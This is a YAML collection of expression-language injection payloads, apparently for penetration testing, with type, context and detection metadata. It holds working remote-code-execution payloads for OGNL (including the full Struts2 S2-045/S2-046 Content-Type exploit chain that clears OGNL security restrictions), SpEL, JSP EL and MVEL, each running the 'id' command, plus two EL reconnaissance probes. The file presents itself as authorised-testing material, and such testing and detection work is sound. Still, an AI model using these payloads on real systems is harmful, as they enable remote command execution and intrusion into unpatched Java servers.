# OGNL and Expression Language Injection Payloads with Metadata
# Usage: Filter by type and context for targeted testing
# WARNING: OGNL payloads often achieve RCE — only test on authorized targets

payloads:
  # OGNL — Struts2 RCE patterns
  - payload: "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    type: OGNL
    context: [parameter, header]
    detection: command-execution
    note: "Struts2 S2-045/S2-046 RCE — Content-Type header injection"
    warning: "OGNL payloads often achieve RCE — only test on authorized targets"

  - payload: "${(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}"
    type: OGNL
    context: [parameter, header, cookie]
    detection: command-execution
    note: "Simple OGNL Runtime.exec() — works if OGNL evaluation is exposed"
    warning: "OGNL payloads often achieve RCE — only test on authorized targets"

  - payload: "%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'id'})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}"
    type: OGNL
    context: [parameter, header]
    detection: command-execution
    note: "Struts2 OGNL with output streaming via HTTP response"
    warning: "OGNL payloads often achieve RCE — only test on authorized targets"

  - payload: "%{(#_memberAccess['allowStaticMethodAccess']=true).(@java.lang.Runtime@getRuntime().exec('id'))}"
    type: OGNL
    context: [parameter]
    detection: command-execution
    note: "OGNL static method access bypass — older Struts2 versions"
    warning: "OGNL payloads often achieve RCE — only test on authorized targets"

  # SpEL — Spring Expression Language
  - payload: "#{T(java.lang.Runtime).getRuntime().exec('id')}"
    type: SpEL
    context: [parameter, header, cookie]
    detection: command-execution
    note: "Spring SpEL RCE — T() operator for type reference"
    warning: "OGNL payloads often achieve RCE — only test on authorized targets"

  - payload: "#{T(java.lang.Runtime).getRuntime().exec(new String[]{'id'})}"
    type: SpEL
    context: [parameter, header]
    detection: command-execution
    note: "SpEL with String array argument — avoids command parsing issues"
    warning: "OGNL payloads often achieve RCE — only test on authorized targets"

  - payload: "${T(java.lang.Runtime).getRuntime().exec('id')}"
    type: SpEL
    context: [parameter, header]
    detection: command-execution
    note: "SpEL using ${} syntax — Spring property placeholder overlap"
    warning: "OGNL payloads often achieve RCE — only test on authorized targets"

  - payload: "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()}"
    type: SpEL
    context: [parameter]
    detection: command-output
    note: "SpEL with command output capture via Scanner"
    warning: "OGNL payloads often achieve RCE — only test on authorized targets"

  # EL — JSP/JSF Expression Language
  - payload: "${Runtime.getRuntime().exec('id')}"
    type: EL
    context: [parameter, header]
    detection: command-execution
    note: "JSP EL injection — javax.el evaluation"
    warning: "OGNL payloads often achieve RCE — only test on authorized targets"

  - payload: "${applicationScope}"
    type: EL
    context: [parameter]
    detection: information-disclosure
    note: "JSP EL — dump application scope attributes for reconnaissance"

  - payload: "${pageContext.request.serverName}"
    type: EL
    context: [parameter]
    detection: information-disclosure
    note: "JSP EL — server name disclosure for reconnaissance"

  # MVEL — MVEL Expression Language
  - payload: "Runtime.getRuntime().exec('id')"
    type: MVEL
    context: [parameter, header]
    detection: command-execution
    note: "MVEL direct Runtime.exec() — used in some Java frameworks and rule engines"
    warning: "OGNL payloads often achieve RCE — only test on authorized targets"
